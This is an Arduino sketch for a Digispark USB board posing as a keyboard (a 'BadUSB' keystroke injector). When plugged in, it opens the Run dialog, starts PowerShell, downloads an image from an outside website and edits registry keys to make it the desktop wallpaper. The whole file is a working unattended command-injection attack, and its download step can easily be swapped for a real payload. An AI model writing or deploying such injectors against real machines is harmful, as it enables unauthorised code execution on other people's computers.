#include "DigiKeyboard.h"
#include <avr/pgmspace.h>

void setup() {
  DigiKeyboard.update();
}

void loop() {
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); /* Open execute dialog. */
  DigiKeyboard.delay(50); /* Delay until write. */
  DigiKeyboard.println(F("powershell")); /* open powershell */
  DigiKeyboard.delay(200); /* Maybe you need to change this delay */
  DigiKeyboard.print(F("$client = New-Object System.Net.WebClient")); /* Commands to update windows background image */
  DigiKeyboard.sendKeyStroke(KEY_ENTER, 0);
  DigiKeyboard.delay(200);
  DigiKeyboard.print(F("$client.DownloadFile(\"http://www.indiewire.com/wp-content/uploads/2017/07/rick-and-morty.png\" , \"rick-and-morty.png\")"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER, 0);
  DigiKeyboard.delay(200);
  DigiKeyboard.print(F("Set-ItemProperty -path \'HKCU:\\Control Panel\\Desktop\' -name wallpaper -value \"%USERPROFILE%\\rick-and-morty.png\""));
  DigiKeyboard.sendKeyStroke(KEY_ENTER, 0);
  DigiKeyboard.delay(200);
  DigiKeyboard.print(F("Set-ItemProperty -path \'HKCU:\\Software\\Microsoft\\Internet Explorer\\Desktop\\General\' -name wallpaper -value \"%USERPROFILE%\\rick-and-morty.png\""));
  DigiKeyboard.sendKeyStroke(KEY_ENTER, 0);
  DigiKeyboard.delay(200);
  DigiKeyboard.print(F("rundll32.exe user32.dll, UpdatePerUserSystemParameters"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER, 0);
  DigiKeyboard.delay(200);
  DigiKeyboard.print(F("exit"));
  DigiKeyboard.sendKeyStroke(KEY_ENTER, 0);
  for(;;){ } /* Stop inserting commands and quit. */
}
